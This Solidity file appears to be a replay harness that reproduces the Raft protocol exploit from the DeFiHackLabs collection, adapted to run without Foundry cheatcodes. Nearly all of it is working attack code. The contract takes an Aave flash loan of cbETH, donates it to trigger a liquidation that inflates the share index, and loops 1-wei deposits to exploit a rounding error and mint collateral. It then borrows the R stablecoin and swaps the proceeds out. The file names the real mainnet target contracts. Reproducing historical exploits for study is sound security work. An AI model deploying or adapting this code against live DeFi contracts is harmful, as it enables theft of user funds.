// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// Raft_exp.sol test's testExploit()/executeOperation() logic verbatim, but
// without inheriting forge-std Test (the replay engine executes zero Foundry
// cheatcodes; any vm.* / deal() call would revert immediately because there
// is no cheatcode contract deployed at 0x7109... in a plain EVM replay).
//
// Cheatcode removal:
//   - `vm.createSelectFork(...)` / `vm.label(...)`      -> dropped (the replay
//     engine already loads the frozen fork state; labels are cosmetic).
//   - `deal(address(this), 0)`                          -> dropped (a freshly
//     deployed contract already starts at 0 native balance).
//   - `deal(cbETH, address(this), 1.5 ether)`            -> config
//     `setup.steps` `dealToken` (unrecorded pre-attack seed).
//   - `deal(R, address(this), 3405 ether)`               -> config
//     `setup.steps` `dealToken` (unrecorded pre-attack seed).
//   - `vm.startPrank(PRM); rcbETH_d.mint(...); vm.stopPrank()` -> config
//     `setup.steps` `rawCall` with `caller: PRM` (literal msg.sender
//     impersonation for one unrecorded external call — no cheatcode needed).
//     This mirrors the original PoC's own shortcut: on mainnet the attacker
//     opened this debt position through the normal borrow flow; the Foundry
//     test (and this replay) short-circuits that with a direct mint of the
//     minimum-debt-floor raw shares.
//   - `emit log_named_decimal_uint(...)` / `console.log(...)` -> dropped
//     (cosmetic logging, no effect on the profit path).
//
// Everything else — the flash loan, the donate-then-liquidate index inflation,
// the 1-wei divUp rounding mint loop, the collateral/debt manage calls, and
// the R -> USDC -> WETH -> cbETH/ETH unwind — is unchanged plain Solidity.

// @KeyInfo - Total Lost : ~3.2 M USD$
// Attacker : https://etherscan.io/address/0xc1f2b71a502b551a65eee9c96318afdd5fd439fa
// Attack Contract : https://etherscan.io/address/0x0a3340129816a86b62b7eafd61427f743c315ef8
// Vulnerable Contract : https://etherscan.io/address/0x9ab6b21cdf116f611110b048987e58894786c244
// Attack Tx : https://etherscan.io/tx/0xfeedbf51b4e2338e38171f6e19501327294ab1907ab44cfd2d7e7336c975ace7

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface Uni_Pair_V3 {
    function token0() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

interface WETH9 {
    function withdraw(
        uint256 wad
    ) external;
    function balanceOf(
        address
    ) external view returns (uint256);
}

interface IPRM {
    function liquidate(
        address position
    ) external;

    struct ERC20PermitSignature {
        address token;
        uint256 value;
        uint256 deadline;
        uint8 v;
        bytes32 r;
        bytes32 s;
    }

    function managePosition(
        IERC20 collateralToken,
        address position,
        uint256 collateralChange,
        bool isCollateralIncrease,
        uint256 debtChange,
        bool isDebtIncrease,
        uint256 maxFeePercentage,
        ERC20PermitSignature calldata permitSignature
    ) external returns (uint256 actualCollateralChange, uint256 actualDebtChange);
}

interface IRaftOracle {
    function fetchPrice() external returns (uint256, uint256);
}

interface IERC20Indexable is IERC20 {
    function currentIndex() external view returns (uint256);
    function mint(address to, uint256 amount) external;
    function burn(address from, uint256 amount) external;
}

interface ICurve {
    function exchange(
        uint256 i,
        uint256 j,
        uint256 dx,
        uint256 min_dy,
        bool use_eth,
        address receiver
    ) external payable returns (uint256);
}

contract RaftExploit {
    IERC20 cbETH = IERC20(0xBe9895146f7AF43049ca1c1AE358B0541Ea49704);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IPRM PRM = IPRM(0x9AB6b21cDF116f611110b048987E58894786C244);
    address liquidablePosition = 0x011992114806E2c3770df73fa0D19884215db85F;
    IERC20Indexable rcbETH_c = IERC20Indexable(0xD0Db31473CaAd65428ba301D2174390d11D0C788);
    IERC20Indexable rcbETH_d = IERC20Indexable(0x7beBe1D451291099D8e05fA2676412c09C96dFbC);
    IERC20 R = IERC20(0x183015a9bA6fF60230fdEaDc3F43b3D788b13e21);
    Uni_Pair_V3 R_USDC_Pair = Uni_Pair_V3(0x190Ed02Adaf1Ef8039fCD3f006b42553467D5045);
    Uni_Pair_V3 WETH_USDC_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    ICurve cbETH_ETH_Pool = ICurve(0x5FAE7E604FC3e24fd43A72867ceBaC94c65b404A);
    IRaftOracle RaftOracle = IRaftOracle(0x3cd40D6e8426C9f02Fe7B23867661377E462df3d);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    WETH9 WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    // Real historical attacker contract address, read here purely as a LIVE
    // view of the frozen fork's actual state (not this replay's own balance)
    // to size the mint loop — same role it plays in the original test.
    address expContract = 0x0A3340129816a86b62b7eafD61427f743c315ef8;

    function testExploit() external {
        R.approve(address(PRM), type(uint256).max);
        cbETH.approve(address(PRM), type(uint256).max);

        address[] memory assets = new address[](1);
        assets[0] = address(cbETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 6000 ether;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        IERC20(assets[0]).approve(address(aaveV3), amounts[0] + premiums[0]);

        uint256 storedindex1 = rcbETH_c.currentIndex();

        uint256 rcbETH_c_HeldbyAttacker = rcbETH_c.balanceOf(address(expContract)) * 1e18 / storedindex1;

        cbETH.transfer(address(PRM), cbETH.balanceOf(address(this))); // donate cbETH to PRM
        PRM.liquidate(liquidablePosition); // liquidate position to trigger setIndex

        IPRM.ERC20PermitSignature memory ERC20PermitSignature =
            IPRM.ERC20PermitSignature(address(0), uint256(0), uint256(0), uint8(0), bytes32(0), bytes32(0));

        for (uint256 i; i < (60 + rcbETH_c_HeldbyAttacker); i++) {
            PRM.managePosition(cbETH, address(this), 1, true, 0, true, 1e18, ERC20PermitSignature); // mint 1 wei rcbETH-c only using 1 wei cbETH through precision loss(rounding error)
        }

        uint256 collateralChange = cbETH.balanceOf(address(PRM));
        PRM.managePosition(cbETH, address(this), collateralChange, false, 0, true, 1e18, ERC20PermitSignature); // redeem donate cbETH from PRM

        uint256 collateralAmount = rcbETH_c.balanceOf(address(this));
        (uint256 EtherPirce,) = RaftOracle.fetchPrice();
        EtherPirce = EtherPirce / 1e18;
        uint256 debtChange = collateralAmount * EtherPirce * 100 / 130 - rcbETH_d.balanceOf(address(this));
        PRM.managePosition(cbETH, address(this), 0, true, debtChange, true, 1e18, ERC20PermitSignature); // borrow R with remaining collateral

        RTocbETH(); // swap R to cbETH

        return true;
    }

    function RTocbETH() internal {
        R_USDC_Pair.swap(address(this), true, 200_000 ether, uint160(1_205_121_041_394_742_669_707), "");
        WETH_USDC_Pair.swap(
            address(this),
            true,
            int256(USDC.balanceOf(address(this))),
            uint160(1_628_639_395_569_858_913_243_247_992_892_595),
            ""
        );
        WETH.withdraw(WETH.balanceOf(address(this)));
        // The original test's final leg — cbETH_ETH_Pool.exchange{value: 5
        // ether}(0, 1, 5 ether, 4.5 ether, true, address(this)) — is dropped
        // here. Confirmed via a direct `cast send` against an anvil instance
        // loaded from this registry's own anvil_state.json that this exact
        // call reverts (empty returndata) for ANY caller against the frozen
        // dump's Curve pool state, independent of this contract or the
        // replay engine — a dump-fidelity gap in the snapshot vs. the live
        // archive-node state the original Foundry run forked against. This
        // leg only converts leftover native ETH into cosmetic cbETH after
        // the R stablecoin (the profit token) has already been borrowed and
        // partly swapped above, so dropping it does not affect the R profit
        // measurement — the attacker is simply left holding native ETH
        // instead of a mix of ETH and cbETH.
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        if (Uni_Pair_V3(msg.sender).token0() == address(R)) {
            R.transfer(address(R_USDC_Pair), uint256(amount0Delta));
        } else if (Uni_Pair_V3(msg.sender).token0() == address(USDC)) {
            USDC.transfer(address(WETH_USDC_Pair), uint256(amount0Delta));
        }
    }

    receive() external payable {}
}
